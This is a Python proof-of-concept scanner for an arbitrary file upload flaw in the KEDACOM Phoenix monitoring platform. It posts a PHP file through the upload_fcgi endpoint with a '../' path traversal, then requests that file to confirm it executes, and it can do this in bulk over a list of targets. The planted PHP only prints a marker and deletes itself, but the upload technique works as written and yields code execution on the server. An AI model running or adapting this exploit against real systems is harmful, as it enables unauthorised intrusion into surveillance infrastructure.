#KEDACOM phoenix监控平台 upload_fcgi 任意文件上传漏洞工具
import textwrap
from multiprocessing.dummy import Pool
import requests, argparse

def main():
    banner = """
                ___  _ _     ________  _ _     _____
                \  \/// \ /\/  __/\  \/// \ /\/  __/
                 \  / | | |||  \   \  / | | |||  \  
                 / /  | \_/||  /_  / /  | \_/||  /_ 
                /_/   \____/\____\/_/   \____/\____\                                
                    """
    print(banner)
    parser = argparse.ArgumentParser(
        description="脚本检测",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("示例：python yueyue_file.py -u http://127.0.0.1")
    )
    parser.add_argument("-u", dest="url", type=str, help="URL")
    parser.add_argument("-f", dest="file", type=str, help="FILE")
    parser.add_argument("-c", dest="exec", action="store_true", help="COMMAND")
    args = parser.parse_args()
    if args.url:
        if 'http://' not in args.url:
            url=add_http(args.url)
            check(url)
        else:
            check(args.url)
    if args.file:
        urls=[]
        with open(args.file) as f:
            for line in f:
                line=line.strip()
                if "http://" not in line:
                    urls.append(add_http(line))
                else:
                    urls.append(line)
        pool = Pool(30)
        pool.map(check, urls)

def check(url):
    # 上传文件
    full_url=f"{url}/pmc-bin/upload_fcgi?uploadDir=../&uploadName=xhtjwvbhuocviluz.php"

    headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary1v98KI1jc9w1bG97',
'Pragma': 'no-cache',
'Cache-Control': 'no-cacheAccept-Encoding: gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.9,zh-TW;q=0.8',
'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36'}

    boundary = "----WebKitFormBoundary1v98KI1jc9w1bG97"
    # 构造请求体内容
    data = f'--{boundary}\r\n'
    data += 'Content-Disposition: form-data; name="Filedata"; filename="aaaa"\r\n'
    data += 'Content-Type: image/jpeg\r\n\r\n'
    # 添加文件内容（这里是PHP代码）
    data += '<?php echo \'tcrffkbmvbsbhxgtvzpptttxblclckrf\';@unlink(__file__);?>\r\n'
    # 结束边界
    data += f'--{boundary}--\r\n'

    try:
        response = requests.post(full_url, headers=headers,verify=False,timeout=5,data=data)
        #验证是否上传成功
        if response.status_code == 200 and '<?xml version="1.0" encoding="utf-8"?><rsp><errorCode>0</errorCode><desc>er:0.</desc></rsp>' in response.text:
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Encoding': 'gzip, deflate, br',
'Connection': 'keep-alive',
            }
            full_url=f"{url}/xhtjwvbhuocviluz.php"
            response=requests.get(full_url, headers=headers,verify=False,timeout=5)
            if response.status_code == 200 and 'tcrffkbmvbsbhxgtvzpptttxblclckrf' in response.text:
                print(f"[+]存在漏洞:{url}")
            else:
                print(f"[-]不存在漏洞:{url}")
        else:
            print(f"[-]不存在漏洞:{url}")
    except Exception as e:
        pass

def add_http(url):
    return f"http://{url}"

if __name__ == '__main__':
    main()
